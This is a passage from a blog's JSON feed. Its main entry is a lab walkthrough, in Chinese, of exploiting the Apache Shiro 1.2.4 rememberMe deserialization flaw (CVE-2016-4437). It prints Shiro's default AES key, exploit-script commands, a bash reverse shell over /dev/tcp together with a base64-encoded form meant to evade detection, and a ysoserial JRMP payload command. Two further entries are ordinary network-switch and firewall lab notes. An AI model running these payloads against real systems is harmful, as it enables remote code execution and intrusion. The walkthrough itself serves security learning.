            "content_html": "<h1 id=\"【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）\"><a href=\"#【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）\" class=\"headerlink\" title=\"【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）\"></a>【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</h1><p>​\tApache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>\n<p>​\tApache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>\n<h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>在反序列化时，没有对其进行过滤，所以如果传入恶意代码将会造成安全问题</p>\n<p><strong>在 1.2.4 版本前，是默认ASE秘钥，Key: kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，可以直接反序列化执行恶意代码。</strong>而在1.2.4之后，ASE秘钥就不为默认了，需要获取到Key才可以进行渗透，这个密钥也可能会被爆破出来，从而被攻击者利用构造payload。</p>\n<p><code>具体流程</code></p>\n<p>Apache Shiro默认使用CookieRememberMeManager。其是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。</p>\n<p>如果用户登录时勾选了rememberMe选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。</p>\n<p>加密的过程是：用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密（密钥key）&#x3D;&gt;base64编码&#x3D;&gt;添加到RememberMe Cookie字段。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。服务端处理cookie的流程：取出请求包中rememberMe的cookie值 &#x3D;&gt; Base64解码&#x3D;&gt;AES解密（密钥key）&#x3D;&gt;反序列化。</p>\n<p>攻击者直接就可以用这个密钥实现上述加密过程，在Cookie字段写入想要服务端执行的恶意代码，最后服务端在对cookie进行解密的时候（反序列化后）就会执行恶意代码。</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20003118.png\" alt=\"屏幕截图 2024-04-18 003118\"></p>\n<p><code>影响版本</code></p>\n<p>Apache Shiro &lt;&#x3D;1.2.4</p>\n<p><code>shiro特征</code></p>\n<p>首先需要判断登录页面是否使用了shiro框架进行身份验证、授权、密码学和会话管理。</p>\n<p>判断方法：进行登录操作时勾选上remember me（记住密码选项），抓包并观察，请求报文中是否有rememberme 字段，响应报文中是否有Set-cookie:rememberMe&#x3D;deleteMe字段。</p>\n<p>如果登录失败且勾选了remember选项，响应报文中有Set-cookie:rememberMe&#x3D;deleteMe；当登录成功，且勾选了remember选项，其响应报文如下图，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段。</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-17%20234618.png\" alt=\"屏幕截图 2024-04-17 234618\"></p>\n<h2 id=\"漏洞验证\"><a href=\"#漏洞验证\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h2><p>利用脚本或工具进行验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro_exploit.py -u http://192.168.100.134:8080</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163349162.png\" alt=\"image-20240418163349162\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163332946.png\" alt=\"image-20240418163332946\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163611522.png\" alt=\"image-20240418163611522\"></p>\n<p>成功获取到AES密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，说明漏洞存在。</p>\n<p>利用dnslog或collaborator进一步验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &quot;ping -c 4 4kp8lyr2idc6mwiqvjbvs6yeh5nvbk.burpcollaborator.net&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185442068.png\" alt=\"image-20240418185442068\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>目标任务：构造cookie获取反弹shell</p>\n<p>nc开启监听，nc -lvvp 6666</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418170744863.png\" alt=\"image-20240418170744863\"></p>\n<p>构造反弹shell的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.100.131/6666 0&gt;&amp;1</span><br><span class=\"line\">命令中包含重定向 ’ &lt; ’ ’ &gt; ’ 和管道符 ’ | ’ 时，需要进行 base64 编码绕过检测。</span><br><span class=\"line\">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>利用序列化工具ysoserial.jar生成payload，并配置监听功能</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>这里相当于在攻击机上启动了一个VPS服务，监听7777端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定利用链生成可执行bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.200.131&#x2F;6666 0&gt;&amp;1命令的序列化数据payload。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload。</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183402795.png\" alt=\"image-20240418183402795\"></p>\n<p>如果不配置此项的话，直接连接，会出现如下情况，无法成功获取shell</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183458178.png\" alt=\"image-20240418183458178\"></p>\n<p>利用脚本构造出cooikie信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro.py 192.168.100.131:7777</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418171624073.png\" alt=\"image-20240418171624073\"></p>\n<p>BP抓包（勾选remember选项），加入将生成的内容加入到cookie中并发送</p>\n<p>注意要将cookie中原有的内容删去，再添加构造的内容作为cookie发送</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20174103.png\" alt=\"屏幕截图 2024-04-18 174103\"></p>\n<p>然后回到kali发现获取到了shell</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174311802.png\" alt=\"image-20240418174311802\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174424393.png\" alt=\"image-20240418174424393\"></p>\n<p>也可以nc开启监听后，直接进行如下命令（脚本将上面的步骤整合到一起了），同样能够获取shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185029472.png\" alt=\"image-20240418185029472\"></p>\n<p>或直接工具进行漏洞利用</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223333.png\" alt=\"屏幕截图 2024-04-18 223333\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418231659688.png\" alt=\"image-20240418231659688\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223718.png\" alt=\"屏幕截图 2024-04-18 223718\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223753.png\" alt=\"屏幕截图 2024-04-18 223753\"></p>\n<p><strong>过程中遇见的问题以及解决方法</strong></p>\n<p>总体上，就是脚本运行的环境问题，环境不适配导致一系列报错</p>\n<p>首先，需要pyhton2版本，包括pip2，在kali上装pip2可以，先访问网址<a href=\"https://bootstrap.pypa.io/pip/2.7/get-pip.py%EF%BC%8C%E8%8E%B7%E5%8F%96get-pip.py%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B0%86%E4%B8%8B%E8%BD%BD%E5%A5%BD%E7%9A%84get-pip.py%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%88%B0Kali%E4%B8%8A%E3%80%82%E5%9C%A8Kali%E7%BB%88%E7%AB%AF%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8python2%E6%89%A7%E8%A1%8Cget-pip.py%E6%96%87%E4%BB%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9Asudo\">https://bootstrap.pypa.io/pip/2.7/get-pip.py，获取get-pip.py文件内容，将下载好的get-pip.py文件传输到Kali上。在Kali终端中，使用python2执行get-pip.py文件，命令如下：sudo</a> python2 get-pip.py即可。运行脚本时报错No module named ‘Crypto’，则运行如下命令：pip2 install pycryptodome，（还有问题可以尝试卸载重装该模块，即pip uninstall与install），然后使用pyhton2运行脚本即可。</p>\n<p>然后就是java的版本过高，工具无法正常使用（需要java8版本），可以参考文章<a href=\"https://blog.csdn.net/huayimy/article/details/130273362\">https://blog.csdn.net/huayimy/article/details/130273362</a></p>\n<p><strong>知识点补充：</strong></p>\n<p>内存马</p>\n<p>普通的木马是写入一个文件去访问,恶意代码是依靠于文件的，执行后就会在内存中被释放掉，但是内存马是依赖于程序本身的动态注册,会在内存中进行一个保存,视为程序的一部分.实现脱离文件后依旧可以运行。</p>\n<p>JRMP</p>\n<p>Java远程方法协议（Java Remote Method Protocol，JRMP），适用于RMI过程中的协议，只有使用这个协议，方法调用双方才能正常进行数据交流。</p>\n<p>RMI</p>\n<p>远程方法调用(Remote Method Invocation)。远程调用服务器上对象的一种接口。能够让在某个java虚拟机上的对象像调用本地对象一样调用另一个java 虚拟机中的对象上的方法。</p>\n<p>参考文章：</p>\n<p><a href=\"https://blog.csdn.net/Bossfrank/article/details/130173880\">https://blog.csdn.net/Bossfrank/article/details/130173880</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/372862.html\">https://www.freebuf.com/articles/web/372862.html</a></p>\n<p><a href=\"https://blog.csdn.net/qq_44159028/article/details/115290013\">https://blog.csdn.net/qq_44159028/article/details/115290013</a></p>\n<p><a href=\"https://blog.csdn.net/huayimy/article/details/130273362\">https://blog.csdn.net/huayimy/article/details/130273362</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/379047.html\">https://www.freebuf.com/articles/web/379047.html</a></p>\n<p><a href=\"https://blog.csdn.net/Candyys/article/details/106038761\">https://blog.csdn.net/Candyys/article/details/106038761</a></p>\n<p><a href=\"https://ares-x.com/tools/runtime-exec\">https://ares-x.com/tools/runtime-exec</a></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/04/16/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/",
            "url": "https://w-sqrt7.github.io/2024/04/16/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/",
            "title": "网基实践题-链路聚合",
            "date_published": "2024-04-16T03:39:01.138Z",
            "content_html": "<h1 id=\"网基实践题-链路聚合\"><a href=\"#网基实践题-链路聚合\" class=\"headerlink\" title=\"网基实践题-链路聚合\"></a>网基实践题-链路聚合</h1><h2 id=\"实验拓扑图：\"><a href=\"#实验拓扑图：\" class=\"headerlink\" title=\"实验拓扑图：\"></a>实验拓扑图：</h2><p><img src=\"/2024/04/16/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-16%20111917.png\" alt=\"屏幕截图 2024-04-16 111917\"></p>\n<h2 id=\"实验过程：\"><a href=\"#实验过程：\" class=\"headerlink\" title=\"实验过程：\"></a>实验过程：</h2><p>1.配置pc机的ip网关等</p>\n<p>这里不在赘述</p>\n<p>2.在SW1和SW2上进行基础配置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[SW1]vlan batch 10 20</span><br><span class=\"line\">[SW1]int e0/0/1</span><br><span class=\"line\">[SW1-Ethernet0/0/1]port link-type access</span><br><span class=\"line\">[SW1-Ethernet0/0/1]port default vlan 10</span><br><span class=\"line\">[SW1-Ethernet0/0/1]quit</span><br><span class=\"line\">[SW1]int e0/0/2</span><br><span class=\"line\">[SW1-Ethernet0/0/2]port link-type access</span><br><span class=\"line\">[SW1-Ethernet0/0/2]port default vlan 20</span><br><span class=\"line\">[SW1-Ethernet0/0/2]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[SW2]vlan batch 10 20</span><br><span class=\"line\">[SW2]int vlanif 10</span><br><span class=\"line\">[SW2-Vlanif10]ip address 192.168.10.254 24</span><br><span class=\"line\">[SW2-Vlanif10]quit</span><br><span class=\"line\">[SW2]int vlanif 20</span><br><span class=\"line\">[SW2-Vlanif20]ip address 192.168.20.254 24</span><br><span class=\"line\">[SW2-Vlanif20]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>3.进行链路聚合配置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[SW1]int Eth-Trunk 1</span><br><span class=\"line\">[SW1-Eth-Trunk1]quit</span><br><span class=\"line\">[SW1]int e0/0/5\t</span><br><span class=\"line\">[SW1-Ethernet0/0/5]eth-trunk 1</span><br><span class=\"line\">[SW1-Ethernet0/0/5]quit</span><br><span class=\"line\">[SW1]int e0/0/6</span><br><span class=\"line\">[SW1-Ethernet0/0/6]eth-trunk 1</span><br><span class=\"line\">[SW1-Ethernet0/0/6]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[SW2]int Eth-Trunk 1</span><br><span class=\"line\">[SW2-Eth-Trunk1]quit</span><br><span class=\"line\">[SW2]int e0/0/1</span><br><span class=\"line\">[SW2-Ethernet0/0/1]eth-trunk 1</span><br><span class=\"line\">[SW2-Ethernet0/0/1]quit</span><br><span class=\"line\">[SW2]int e0/0/4</span><br><span class=\"line\">[SW2-Ethernet0/0/4]eth-trunk 1</span><br><span class=\"line\">[SW2-Ethernet0/0/4]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[SW1]int Eth-Trunk 1</span><br><span class=\"line\">[SW1-Eth-Trunk1]port link-type trunk</span><br><span class=\"line\">[SW1-Eth-Trunk1]port trunk allow-pass vlan 10 20</span><br><span class=\"line\">[SW1-Eth-Trunk1]quit</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[SW2]int Eth-Trunk 1</span><br><span class=\"line\">[SW2-Eth-Trunk1]port link-type trunk</span><br><span class=\"line\">[SW2-Eth-Trunk1]port trunk allow-pass vlan 10 20</span><br><span class=\"line\">[SW2-Eth-Trunk1]quit</span><br></pre></td></tr></table></figure>\n\n<p>然后进行测试，结果为两台主机之间可以互相ping通</p>\n",
            "tags": [
                "原创",
                "网基",
                "eNSP"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/",
            "url": "https://w-sqrt7.github.io/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/",
            "title": "网基实践题-防火墙配置",
            "date_published": "2024-04-11T11:32:04.546Z",
            "content_html": "<h1 id=\"网基实践题-防火墙配置\"><a href=\"#网基实践题-防火墙配置\" class=\"headerlink\" title=\"网基实践题-防火墙配置\"></a>网基实践题-防火墙配置</h1><h2 id=\"实验拓扑图一：\"><a href=\"#实验拓扑图一：\" class=\"headerlink\" title=\"实验拓扑图一：\"></a>实验拓扑图一：</h2><p><img src=\"/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240411185710090.png\" alt=\"image-20240411185710090\"></p>\n<h2 id=\"实验过程：\"><a href=\"#实验过程：\" class=\"headerlink\" title=\"实验过程：\"></a>实验过程：</h2><p>1.首先配置云(cloud1)，根据自己的虚拟网卡配置，具体操作参考下图</p>\n<p><img src=\"/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-11%20185831.png\" alt=\"屏幕截图 2024-04-11 185831\"></p>\n<p>2.然后配置防火墙，首先配本地访问的端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG6000V1]int g0/0/0</span><br><span class=\"line\">[USG6000V1-GigabitEthernet0/0/0]ip address 192.168.100.18 24</span><br><span class=\"line\">[USG6000V1-GigabitEthernet0/0/0]service-manage enable\t#防火墙安全策略配置管理协议启用访问管理</span><br><span class=\"line\">[USG6000V1-GigabitEthernet0/0/0]service-manage ping permit\t#允许ping防火墙</span><br><span class=\"line\">[USG6000V1-GigabitEthernet0/0/0]service-manage http permit \t</span><br><span class=\"line\">[USG6000V1-GigabitEthernet0/0/0]service-manage https permit\t#允许浏览器访问防火墙进行配置</span><br><span class=\"line\">[USG6000V1-GigabitEthernet0/0/0]quit</span><br></pre></td></tr></table></figure>\n\n<p>配置完成后，可以使用ping命令先测试，测试成功后，浏览器访问登录</p>\n<img src=\"/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240411190516243.png\" alt=\"image-20240411190516243\" style=\"zoom:50%;\">\n\n<img src=\"/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240411190607110.png\" alt=\"image-20240411190607110\" style=\"zoom: 33%;\">\n\n\n\n<p>3.然后配置防火墙安全区域，即使pc1能够和防火墙正常通信</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[USG6000V1]int g1/0/0</span><br><span class=\"line\">[USG6000V1-GigabitEthernet1/0/0]ip address 192.168.100.20 24</span><br><span class=\"line\">[USG6000V1-GigabitEthernet1/0/0]service-manage enable </span><br><span class=\"line\">[USG6000V1-GigabitEthernet1/0/0]service-manage all permit </span><br><span class=\"line\">[USG6000V1-GigabitEthernet1/0/0]quit</span><br><span class=\"line\">[USG6000V1]firewall zone trust \t#进入trust区域</span><br><span class=\"line\">[USG6000V1-zone-trust]add interface g1/0/0\t#将接口G1/0/0添加到trust区域中</span><br><span class=\"line\">[USG6000V1-zone-trust]quit</span><br></pre></td></tr></table></figure>\n\n<p>然后再尝试利用pc机ping防火墙，可以正常通信。</p>\n<h2 id=\"实验拓扑图二：\"><a href=\"#实验拓扑图二：\" class=\"headerlink\" title=\"实验拓扑图二：\"></a>实验拓扑图二：</h2><p><img src=\"/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416094036246.png\" alt=\"image-20240416094036246\"></p>\n<h2 id=\"实验过程：-1\"><a href=\"#实验过程：-1\" class=\"headerlink\" title=\"实验过程：\"></a>实验过程：</h2><p>1.首先配置pc1和pc2，注意网关</p>\n<p><img src=\"/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416094200587.png\" alt=\"image-20240416094200587\"></p>\n<p><img src=\"/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416094249574.png\" alt=\"image-20240416094249574\"></p>\n<p>2.然后配置防火墙的两个端口，就是刚才两台pc机的网关。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;USG6000V1&gt;sys</span><br><span class=\"line\">[USG6000V1]sysname FW1</span><br><span class=\"line\">[FW1]int g1/0/0</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/0]ip address 10.1.2.2 24</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/0]quit</span><br><span class=\"line\">[FW1]int g1/0/1</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/1]ip address 2.2.2.1 24</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure>\n\n\n\n<p>3.然后配置各端口上的service-manage，保证ping命令能够允许</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[FW1]int g1/0/0</span><br><span class=\"line\">[FW1-GigabitEthernet1/0/0]service-manage enable</span><br><span 